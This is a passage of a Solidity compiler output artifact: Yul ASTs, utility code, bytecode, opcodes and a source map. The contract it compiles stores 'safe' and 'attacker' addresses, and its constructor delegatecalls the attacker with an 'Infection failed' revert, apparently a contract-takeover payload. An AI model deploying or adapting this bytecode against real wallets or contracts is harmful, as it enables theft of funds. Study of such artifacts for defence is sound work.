																"src": "3124:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nativeSrc": "3117:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "3117:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524_to_t_string_memory_ptr_fromStack",
												"nativeSrc": "2776:366:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "2910:3:1",
														"nodeType": "YulTypedName",
														"src": "2910:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nativeSrc": "2918:3:1",
														"nodeType": "YulTypedName",
														"src": "2918:3:1",
														"type": ""
													}
												],
												"src": "2776:366:1"
											},
											{
												"body": {
													"nativeSrc": "3319:248:1",
													"nodeType": "YulBlock",
													"src": "3319:248:1",
													"statements": [
														{
															"nativeSrc": "3329:26:1",
															"nodeType": "YulAssignment",
															"src": "3329:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "3341:9:1",
																		"nodeType": "YulIdentifier",
																		"src": "3341:9:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3352:2:1",
																		"nodeType": "YulLiteral",
																		"src": "3352:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "3337:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "3337:3:1"
																},
																"nativeSrc": "3337:18:1",
																"nodeType": "YulFunctionCall",
																"src": "3337:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "3329:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "3329:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "3376:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "3376:9:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "3387:1:1",
																				"nodeType": "YulLiteral",
																				"src": "3387:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "3372:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "3372:3:1"
																		},
																		"nativeSrc": "3372:17:1",
																		"nodeType": "YulFunctionCall",
																		"src": "3372:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nativeSrc": "3395:4:1",
																				"nodeType": "YulIdentifier",
																				"src": "3395:4:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "3401:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "3401:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "3391:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "3391:3:1"
																		},
																		"nativeSrc": "3391:20:1",
																		"nodeType": "YulFunctionCall",
																		"src": "3391:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "3365:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "3365:6:1"
																},
																"nativeSrc": "3365:47:1",
																"nodeType": "YulFunctionCall",
																"src": "3365:47:1"
															},
															"nativeSrc": "3365:47:1",
															"nodeType": "YulExpressionStatement",
															"src": "3365:47:1"
														},
														{
															"nativeSrc": "3421:139:1",
															"nodeType": "YulAssignment",
															"src": "3421:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nativeSrc": "3555:4:1",
																		"nodeType": "YulIdentifier",
																		"src": "3555:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524_to_t_string_memory_ptr_fromStack",
																	"nativeSrc": "3429:124:1",
																	"nodeType": "YulIdentifier",
																	"src": "3429:124:1"
																},
																"nativeSrc": "3429:131:1",
																"nodeType": "YulFunctionCall",
																"src": "3429:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "3421:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "3421:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524__to_t_string_memory_ptr__fromStack_reversed",
												"nativeSrc": "3148:419:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "3299:9:1",
														"nodeType": "YulTypedName",
														"src": "3299:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "3314:4:1",
														"nodeType": "YulTypedName",
														"src": "3314:4:1",
														"type": ""
													}
												],
												"src": "3148:419:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_addresst_address_fromMemory(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function copy_memory_to_memory_with_cleanup(src, dst, length) {\n\n        mcopy(dst, src, length)\n        mstore(add(dst, length), 0)\n\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524(memPtr) {\n\n        mstore(add(memPtr, 0), \"Infection failed\")\n\n    }\n\n    function abi_encode_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 16)\n        store_literal_in_memory_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b506040516104d63803806104d683398181016040528101906100319190610260565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f2665f77d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161017991906102f0565b5f60405180830381855af49150503d805f81146101b1576040519150601f19603f3d011682016040523d82523d5f602084013e6101b6565b606091505b50509050806101fa576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101f190610360565b60405180910390fd5b50505061037e565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61022f82610206565b9050919050565b61023f81610225565b8114610249575f5ffd5b50565b5f8151905061025a81610236565b92915050565b5f5f6040838503121561027657610275610202565b5b5f6102838582860161024c565b92505060206102948582860161024c565b9150509250929050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6102ca8261029e565b6102d481856102a8565b93506102e48185602086016102b2565b80840191505092915050565b5f6102fb82846102c0565b915081905092915050565b5f82825260208201905092915050565b7f496e66656374696f6e206661696c6564000000000000000000000000000000005f82015250565b5f61034a601083610306565b915061035582610316565b602082019050919050565b5f6020820190508181035f8301526103778161033e565b9050919050565b61014b8061038b5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063186f03541461003857806348eb76ee14610056575b5f5ffd5b610040610074565b60405161004d91906100fc565b60405180910390f35b61005e610098565b60405161006b91906100fc565b60405180910390f35b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e6826100bd565b9050919050565b6100f6816100dc565b82525050565b5f60208201905061010f5f8301846100ed565b9291505056fea26469706673582212201340d7c46579a0c510b0c09cc75cea69e1948ab2da9fd28e47d9e6af1613055964736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4D6 CODESIZE SUB DUP1 PUSH2 0x4D6 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x260 JUMP JUMPDEST DUP2 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x2665F77D00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x179 SWAP2 SWAP1 PUSH2 0x2F0 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x1B1 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1B6 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1FA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1F1 SWAP1 PUSH2 0x360 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP PUSH2 0x37E JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x22F DUP3 PUSH2 0x206 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x23F DUP2 PUSH2 0x225 JUMP JUMPDEST DUP2 EQ PUSH2 0x249 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x25A DUP2 PUSH2 0x236 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x276 JUMPI PUSH2 0x275 PUSH2 0x202 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x283 DUP6 DUP3 DUP7 ADD PUSH2 0x24C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x294 DUP6 DUP3 DUP7 ADD PUSH2 0x24C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x2CA DUP3 PUSH2 0x29E JUMP JUMPDEST PUSH2 0x2D4 DUP2 DUP6 PUSH2 0x2A8 JUMP JUMPDEST SWAP4 POP PUSH2 0x2E4 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2B2 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x2FB DUP3 DUP5 PUSH2 0x2C0 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x496E66656374696F6E206661696C656400000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x34A PUSH1 0x10 DUP4 PUSH2 0x306 JUMP JUMPDEST SWAP2 POP PUSH2 0x355 DUP3 PUSH2 0x316 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x377 DUP2 PUSH2 0x33E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x14B DUP1 PUSH2 0x38B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x186F0354 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x56 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x74 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4D SWAP2 SWAP1 PUSH2 0xFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x5E PUSH2 0x98 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6B SWAP2 SWAP1 PUSH2 0xFC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE6 DUP3 PUSH2 0xBD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF6 DUP2 PUSH2 0xDC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x10F PUSH0 DUP4 ADD DUP5 PUSH2 0xED JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SGT BLOCKHASH 0xD7 0xC4 PUSH6 0x79A0C510B0C0 SWAP13 0xC7 TLOAD 0xEA PUSH10 0xE1948AB2DA9FD28E47D9 DUPN 0xAF AND SGT SDIV MSIZE PUSH5 0x736F6C6343 STOP ADDMOD SAR STOP CALLER ",
							"sourceMap": "0:382:0:-:0;;;83:297;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;146:5;139:4;;:12;;;;;;;;;;;;;;;;;;172:9;161:8;;:20;;;;;;;;;;;;;;;;;;237:7;250:8;;;;;;;;;;;:21;;285:37;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;250:82;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;236:96;;;350:2;342:31;;;;;;;;;;;;:::i;:::-;;;;;;;;;129:251;83:297;;0:382;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:507::-;924:6;932;981:2;969:9;960:7;956:23;952:32;949:119;;;987:79;;:::i;:::-;949:119;1107:1;1132:64;1188:7;1179:6;1168:9;1164:22;1132:64;:::i;:::-;1122:74;;1078:128;1245:2;1271:64;1327:7;1318:6;1307:9;1303:22;1271:64;:::i;:::-;1261:74;;1216:129;845:507;;;;;:::o;1358:98::-;1409:6;1443:5;1437:12;1427:22;;1358:98;;;:::o;1462:147::-;1563:11;1600:3;1585:18;;1462:147;;;;:::o;1615:139::-;1704:6;1699:3;1694;1688:23;1745:1;1736:6;1731:3;1727:16;1720:27;1615:139;;;:::o;1760:386::-;1864:3;1892:38;1924:5;1892:38;:::i;:::-;1946:88;2027:6;2022:3;1946:88;:::i;:::-;1939:95;;2043:65;2101:6;2096:3;2089:4;2082:5;2078:16;2043:65;:::i;:::-;2133:6;2128:3;2124:16;2117:23;;1868:278;1760:386;;;;:::o;2152:271::-;2282:3;2304:93;2393:3;2384:6;2304:93;:::i;:::-;2297:100;;2414:3;2407:10;;2152:271;;;;:::o;2429:169::-;2513:11;2547:6;2542:3;2535:19;2587:4;2582:3;2578:14;2563:29;;2429:169;;;;:::o;2604:166::-;2744:18;2740:1;2732:6;2728:14;2721:42;2604:166;:::o;2776:366::-;2918:3;2939:67;3003:2;2998:3;2939:67;:::i;:::-;2932:74;;3015:93;3104:3;3015:93;:::i;:::-;3133:2;3128:3;3124:12;3117:19;;2776:366;;;:::o;3148:419::-;3314:4;3352:2;3341:9;3337:18;3329:26;;3401:9;3395:4;3391:20;3387:1;3376:9;3372:17;3365:47;3429:131;3555:4;3429:131;:::i;:::-;3421:139;;3148:419;;;:::o;0:382:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@attacker_4": {
									"entryPoint": 152,
									"id": 4,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@safe_2": {
									"entryPoint": 116,
									"id": 2,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 237,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 252,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 220,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 189,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:590:1",
										"nodeType": "YulBlock",
										"src": "0:590:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "52:81:1",
													"nodeType": "YulBlock",
													"src": "52:81:1",
													"statements": [
														{
															"nativeSrc": "62:65:1",
															"nodeType": "YulAssignment",
															"src": "62:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "77:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "77:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "84:42:1",
																		"nodeType": "YulLiteral",
																		"src": "84:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "73:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "73:3:1"
																},
																"nativeSrc": "73:54:1",
																"nodeType": "YulFunctionCall",
																"src": "73:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "62:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "7:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "34:5:1",
														"nodeType": "YulTypedName",
														"src": "34:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "44:7:1",
														"nodeType": "YulTypedName",
														"src": "44:7:1",
														"type": ""
													}
												],
												"src": "7:126:1"
											},
											{
												"body": {
													"nativeSrc": "184:51:1",
													"nodeType": "YulBlock",
													"src": "184:51:1",
													"statements": [
														{
															"nativeSrc": "194:35:1",
															"nodeType": "YulAssignment",
															"src": "194:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "223:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "223:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "205:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "205:17:1"
																},
																"nativeSrc": "205:24:1",
																"nodeType": "YulFunctionCall",
																"src": "205:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "194:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "194:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "139:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "166:5:1",
														"nodeType": "YulTypedName",
														"src": "166:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "176:7:1",
														"nodeType": "YulTypedName",
														"src": "176:7:1",
														"type": ""
													}
												],
												"src": "139:96:1"
											},
											{
												"body": {
													"nativeSrc": "306:53:1",
													"nodeType": "YulBlock",
													"src": "306:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "323:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "323:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "346:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "346:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nativeSrc": "328:17:1",
																			"nodeType": "YulIdentifier",
																			"src": "328:17:1"
																		},
																		"nativeSrc": "328:24:1",
																		"nodeType": "YulFunctionCall",
																		"src": "328:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "316:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "316:6:1"
																},
																"nativeSrc": "316:37:1",
																"nodeType": "YulFunctionCall",
																"src": "316:37:1"
															},
															"nativeSrc": "316:37:1",
															"nodeType": "YulExpressionStatement",
															"src": "316:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nativeSrc": "241:118:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "294:5:1",
														"nodeType": "YulTypedName",
														"src": "294:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "301:3:1",
														"nodeType": "YulTypedName",
														"src": "301:3:1",
														"type": ""
													}
												],
												"src": "241:118:1"
											},
											{
												"body": {
													"nativeSrc": "463:124:1",
													"nodeType": "YulBlock",
													"src": "463:124:1",
													"statements": [
														{
															"nativeSrc": "473:26:1",
															"nodeType": "YulAssignment",
															"src": "473:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "485:9:1",
																		"nodeType": "YulIdentifier",
																		"src": "485:9:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "496:2:1",
																		"nodeType": "YulLiteral",
																		"src": "496:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "481:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "481:3:1"
																},
																"nativeSrc": "481:18:1",
																"nodeType": "YulFunctionCall",
																"src": "481:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "473:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "473:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "553:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "553:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "566:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "566:9:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "577:1:1",
																				"nodeType": "YulLiteral",
																				"src": "577:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "562:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "562:3:1"
																		},
																		"nativeSrc": "562:17:1",
																		"nodeType": "YulFunctionCall",
																		"src": "562:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "509:43:1",
																	"nodeType": "YulIdentifier",
																	"src": "509:43:1"
																},
																"nativeSrc": "509:71:1",
																"nodeType": "YulFunctionCall",
																"src": "509:71:1"
															},
															"nativeSrc": "509:71:1",
															"nodeType": "YulExpressionStatement",
															"src": "509:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
